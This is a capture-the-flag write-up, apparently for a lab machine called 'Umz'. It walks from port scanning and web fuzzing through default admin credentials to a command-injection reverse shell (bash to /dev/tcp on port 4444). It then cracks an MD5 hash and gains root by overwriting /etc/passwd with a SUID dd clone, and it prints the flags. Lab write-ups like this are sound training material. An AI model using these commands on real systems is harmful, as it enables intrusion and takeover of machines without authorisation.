This writeup details the steps taken to compromise the HackTheBox machine "Umz," covering initial reconnaissance, web enumeration, vulnerability exploitation, and privilege escalation.

### Initial Reconnaissance

The first step involved identifying active hosts on the network and scanning the target for open ports and services.

1. **ARP Scan:**
The initial output shows an ARP scan of the `192.168.1.0/24` network, identifying four unique hosts. The target machine, `192.168.1.30`, is identified with the MAC address `08:00:27:a7:d2:7c`, associated with "PCS Systemtechnik GmbH," which is often a vendor for virtual machines (like Oracle VirtualBox).

```shellscript
Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 222
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.1     cc:b0:71:a8:71:e8      1      42  Fiberhome Telecommunication Technologies Co.,LTD
192.168.1.30    08:00:27:a7:d2:7c      1      60  PCS Systemtechnik GmbH
192.168.1.7     86:d3:bc:f2:53:0f      1      60  Unknown vendor
192.168.1.3     a4:f0:5e:9a:8f:ad      1      60  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD
```


2. **Nmap Scan:**
A comprehensive Nmap scan (`-sS -sV -Pn --min-rate=1000 --max-retries=2 -p-`) was performed on `192.168.1.30` to identify all open TCP ports and their respective services and versions.

```shellscript
nmap -sS -sV -Pn  --min-rate=1000 --max-retries=2 192.168.1.30 -p-
```

The scan revealed two open ports:

1. **Port 22/tcp:** OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
2. **Port 80/tcp:** Apache httpd 2.4.62 ((Debian))


```plaintext
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```




### Web Enumeration (Port 80)

With port 80 open, the next step was to enumerate web content.

1. **Gobuster Directory Scan (directory-list-2.3-medium.txt):**
The first `gobuster` scan using `directory-list-2.3-medium.txt` encountered numerous `context deadline exceeded` errors, indicating that the web server was likely timing out or actively blocking requests, possibly due to a rate-limiting or DDoS protection mechanism. Only `/server-status` was found with a 403 Forbidden status.

```shellscript
gobuster dir -u http://192.168.1.30 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```


2. **Gobuster Directory Scan (raft-medium-files-lowercase.txt):**
A second `gobuster` scan with a different wordlist (`raft-medium-files-lowercase.txt`) yielded more results, including `index.php` and `index.html` with a 200 OK status.

```shellscript
gobuster dir -u http://192.168.1.30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
```

```plaintext
/index.php            (Status: 200) [Size: 2714]
/index.html           (Status: 200) [Size: 3024]
```


3. **Analyzing `index.php` and `index.html`:**

1. **`index.php`:**
`curl http://192.168.1.30/index.php` revealed a "Resource Stress Test Interface" with a "DDoS Protection Active" warning and a "Service Status Monitor" showing "🟢 System Operational - Health Check Identifier: **HEALTHY_STRING**". This suggests the server is designed to handle stress and might have a mechanism to detect and respond to high request rates.

```html
<div class="alert">
    ⚠ DDoS Protection Active: This service is protected by automated anti-DDoS measures.
    Excessive requests will trigger security protocols.
</div>
<h1 class="status-header">Resource Stress Test Interface</h1>
<div class="load-indicator">
    <h2>Service Status Monitor</h2>
    <p>🟢 System Operational - Health Check Identifier: <strong>HEALTHY_STRING</strong></p>
</div>
```


2. **`index.html`:**
`curl http://192.168.1.30/index.html` displayed a "cyber fortress 9000" page with a defiant message about DDoS attacks, implying the server is robust against such attacks.

```html
<h1 style="font-size: 4.5em; color: #ffff00; text-align: center; text-shadow: 0 0 20px #ff0000; margin-top: 20vh;" class="fire-pulse">
    😈 your ddos means nothing 😈
</h1>
```







### Vulnerability Identification and Port Change

The "Resource Stress Test" and "DDoS Protection" messages on `index.php` were key indicators.

1. **Fuzzing `index.php` for LFI/Command Injection:**
An attempt was made to test for Local File Inclusion (LFI) by fuzzing the `index.php` with a `FUZZ` parameter and `/etc/passwd`.

```shellscript
ffuf -u 'http://192.168.1.30/index.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

Initially, all responses had the same size (2714 bytes), indicating no LFI. Filtering by size (`-fs -2714` and `-fs 2714`) confirmed this.

However, a crucial observation was made: the `index.php` page mentioned "Resource Stress Test." This led to fuzzing a `stress` parameter.

```shellscript
ffuf -u 'http://192.168.1.30/index.php?stress=FUZZ' -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -fw 909
```

This `ffuf` command was interrupted (`Ctrl-C`), but the user noted: "**Now this port is closed and we have the port 8080 open**". This is a critical finding. The "stress test" functionality, when triggered with a large number of requests (even if interrupted), caused the web server on port 80 to shut down and a new service to start on port 8080.




### New Service Enumeration (Port 8080)

1. **Nmap Scan (Port 8080):**
A subsequent Nmap scan confirmed that port 80 was no longer serving Apache, and port 8080 was now open, running a `Werkzeug httpd 1.0.1 (Python 3.9.2)`. This indicates a Python-based web application.

```shellscript
nmap -sS -sV -Pn  --min-rate=1000 --max-retries=2 192.168.1.30
```

```plaintext
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
```


2. **Gobuster Directory Scan (Port 8080):**
A `gobuster` scan on port 8080 revealed new directories: `/login`, `/admin` (which redirects to `/login`), and `/console`.

```shellscript
gobuster dir -u http://192.168.1.30:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```plaintext
/login                (Status: 200) [Size: 1838]
/admin                (Status: 302) [Size: 219] [--> http://192.168.1.30:8080/login]
/console              (Status: 200) [Size: 1985]
```


3. **Admin Panel Access:**
The user attempted to log in to the `/admin` panel and successfully gained access using default credentials: `admin:admin`.

<img width="1039" height="418" alt="image" src="https://github.com/user-attachments/assets/d867ba10-75b5-4eb9-975a-8817fcb3b91d" />


The `/console` page was noted to require a PIN sent to the server's console, which is not accessible to an attacker.




### Gaining Initial Foothold

The "System Maintenance Panel" on `/admin` provided a command execution vulnerability.

1. **Command Injection via Ping Functionality:**
The admin panel had an "Enter IP address" field and an "Execute Ping" button. This is a classic indicator of a command injection vulnerability.

<img width="1039" height="418" alt="image" src="https://github.com/user-attachments/assets/baba82d8-d69c-4e58-903d-d55aeb2c3dd4" />


The user attempted to inject a reverse shell command: `/bin/bash -c "bash -i >& /dev/tcp/192.168.1.5/4444 0>&1"`. The command result showed a timeout, but this confirmed that commands could be executed.

<img width="1039" height="418" alt="image" src="https://github.com/user-attachments/assets/c38940fc-8dac-4b71-b66f-dbe15c9e17d5" />


To verify command execution, `tcpdump` was used to monitor ICMP traffic. Pinging the attacker's machine from the target confirmed the vulnerability.

```shellscript
sudo tcpdump icmp
```

```plaintext
15:22:04.267802 IP 192.168.1.30 > kali: ICMP echo request, id 63053, seq 1, length 64
15:22:04.267872 IP kali > 192.168.1.30: ICMP echo reply, id 63053, seq 1, length 64
```


2. **Reverse Shell:**
A Netcat listener was set up on the attacker's machine (Kali) on port 4444.

```shellscript
nc -lvnp 4444
```

Executing the reverse shell command in the admin panel successfully established a connection, granting a shell as the `welcome` user.

```plaintext
Connection received on 192.168.1.30 39244
bash: cannot set terminal process group (441): Inappropriate ioctl for device
bash: no job control in this shell
welcome@Umz:/root$
```


3. **User Flag (`user.txt`):**
Basic enumeration as the `welcome` user led to the `user.txt` flag in `/home/welcome/`.

```shellscript
welcome@Umz:/root$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
welcome@Umz:/root$ cd /home
welcome@Umz:/home$ ls
umzyyds  welcome
welcome@Umz:/home$ cd welcome
welcome@Umz:~$ ls
user.txt
welcome@Umz:~$ cat user.txt
flag{user-4483f72525b3c316704cf126bec02d5c}
```




### Privilege Escalation to `umzyyds`

1. **Sudo Rights Enumeration:**
Checking `sudo -l` for the `welcome` user revealed that `welcome` could run `/usr/bin/md5sum` as `ALL` users without a password.

```shellscript
welcome@Umz:/home$ sudo -l
User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

An initial attempt to use `md5sum` for command execution (`sudo /usr/bin/md5sum /dev/zero <<< 'id'`) was unsuccessful, as `md5sum` does not interpret input as commands.


2. **SUID Binary Enumeration:**
To find other privilege escalation vectors, SUID binaries were searched for:

```shellscript
welcome@Umz:~$ find / -perm -4000 2> /dev/null
```

This command listed several SUID binaries, including common ones like `sudo`, `passwd`, `mount`, etc.


3. **Discovering `umz.pass`:**
Further enumeration of the file system led to the `/opt/flask-debug` directory, which contained `flask_debug.py` and `umz.pass`.

```shellscript
welcome@Umz:/opt$ ls
flask-debug
welcome@Umz:/opt$ cd flask-debug
welcome@Umz:/opt/flask-debug$ ls
flask_debug.py  umz.pass
```

The `umz.pass` file was hashed using the `md5sum` utility that `welcome` could run with `sudo`.

```shellscript
welcome@Umz:/opt/flask-debug$ sudo /usr/bin/md5sum umz.pass
a963fadd7fd379f9bc294ad0ba44f659  umz.pass
```


4. **Cracking the MD5 Hash:**
The MD5 hash `a963fadd7fd379f9bc294ad0ba44f659` was then cracked using `john` and the `rockyou.txt` wordlist. It was necessary to specify the format as `raw-md5` for `john` to correctly identify and crack the hash.

```shellscript
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Alternatively, a custom bash script was used to iterate through the wordlist and calculate MD5 hashes, comparing them to the target hash.

```shellscript
#!/bin/bash
wordlist="/usr/share/wordlists/rockyou.txt"
while IFS= read -r word || [ -n "$word" ]; do
    hash=$( echo "$word" | md5sum | awk '{print $1}' )
    if [ "$hash" == "a963fadd7fd379f9bc294ad0ba44f659" ]; then
        echo "Password Found : $word"
        exit 0
    fi
done < "$wordlist"
```

The password found was `sunshine3`.


5. **Switching to `umzyyds` User:**
Using the cracked password, the user `umzyyds` was accessed via `su`. A stable TTY shell was then spawned using Python.

```shellscript
welcome@Umz:/home$ su umzyyds
Password: sunshine3
umzyyds@Umz:/home$ python3 -c "import pty;pty.spawn('/bin/bash')"
```




### Privilege Escalation to Root

1. **Enumerating `umzyyds` Home Directory:**
In `umzyyds`'s home directory, a SUID binary named `Dashazi` was found.

```shellscript
umzyyds@Umz:~$ ls -la
total 96
drwx------ 2 umzyyds umzyyds  4096 May  3 10:42 .
drwxr-xr-x 4 root    root     4096 May  3 10:27 ..
lrwxrwxrwx 1 root    root        9 May  3 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 umzyyds umzyyds   220 May  3 10:27 .bash_logout
-rw-r--r-- 1 umzyyds umzyyds  3526 May  3 10:27 .bashrc
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
-rw-r--r-- 1 umzyyds umzyyds   807 May  3 10:27 .profile
```

The `rws` permission (`-rwsr-sr-x`) indicates that `Dashazi` runs with the privileges of its owner, which is `root`.


2. **Analyzing `Dashazi`:**
The `Dashazi` binary was copied to the attacker's machine using `scp` for analysis.

```shellscript
scp umzyyds@192.168.1.30:/home/umzyyds/Dashazi ./
```

Running `./Dashazi --help` revealed that it behaves exactly like the `dd` command, a utility for converting and copying files.

```shellscript
./Dashazi --help
Usage: ./Dashazi [OPERAND]...  or:  ./Dashazi OPTION
Copy a file, converting and formatting according to the operands.
...
if=FILE         read from FILE instead of stdin
of=FILE         write to FILE instead of stdout
```

This is a critical vulnerability. Since `Dashazi` runs as root and has `if=FILE` and `of=FILE` options, it can be used to read from and write to any file on the system, including sensitive files like `/etc/passwd`.


3. **Root Access via `/etc/passwd` Manipulation:**
The strategy was to modify the `/etc/passwd` file to gain root access.

1. **Step 1: Create a temporary `passwd` file with a blank root password.**
First, a `passwd` file was created with a blank password for the `root` user.

```shellscript
umzyyds@Umz:~$ echo 'root::0:0:root:/root:/bin/bash' > passwd
```


2. **Step 2: Overwrite `/etc/passwd` with the modified file.**
The `Dashazi` binary was then used to overwrite the `/etc/passwd` file with the newly created `passwd` file.

```shellscript
umzyyds@Umz:~$ ./Dashazi if=passwd of=/etc/passwd
0+1 records in
0+1 records out
31 bytes copied, 0.000647042 s, 47.9 kB/s
```


3. **Step 3: Attempt `su root` (fails with blank password).**
Attempting `su root` with a blank password failed, as the system still required authentication. This is expected behavior for `su` with blank passwords in some Linux configurations.

```shellscript
umzyyds@Umz:~$ su root
Password:
su: Authentication failure
```


4. **Step 4: Generate a strong root password hash and overwrite `/etc/passwd` again.**
A new password hash for `root` was generated (e.g., using `openssl passwd -6` or `mkpasswd`). The provided input shows the hash `root:$6$IdG5rFYHjLllaUrd$hckbjvcTp7cwp6mlGnGvn6Cdu8MkxQCl.aBYuCA8CQBjCkqx2X1DeF3s5fbTpkhqCTeo9FIO8KwrkG0tktkLL1:0:0:root:/root:/bin/bash`. This hash corresponds to the password `MySecurePass123`.

```shellscript
umzyyds@Umz:~$ echo 'root:$6$IdG5rFYHjLllaUrd$hckbjvcTp7cwp6mlGnGvn6Cdu8MkxQCl.aBYuCA8CQBjCkqx2X1DeF3s5fbTpkhqCTeo9FIO8KwrkG0tktkLL1:0:0:root:/root:/bin/bash' > passwd
umzyyds@Umz:~$ ./Dashazi if=passwd of=/etc/passwd
0+1 records in
0+1 records out
137 bytes copied, 0.000720738 s, 190 kB/s
```


5. **Step 5: Gain root access and retrieve `root.txt`.**
With the `/etc/passwd` file updated with a known password hash for root, `su root` was successful.

```shellscript
umzyyds@Umz:~$ su root
Password:
root@Umz:/home/umzyyds# id
uid=0(root) gid=0(root) groups=0(root)
```

Finally, the `root.txt` flag was retrieved from the `/root` directory.

```shellscript
root@Umz:/home/umzyyds# cd /root
root@Umz:~# ls
flask_debug.py  monitor.sh  root.txt
root@Umz:~# cat root.txt
flag{root-a73c45107081c08dd4560206b8ef8205}
```







This concludes the machine compromise.
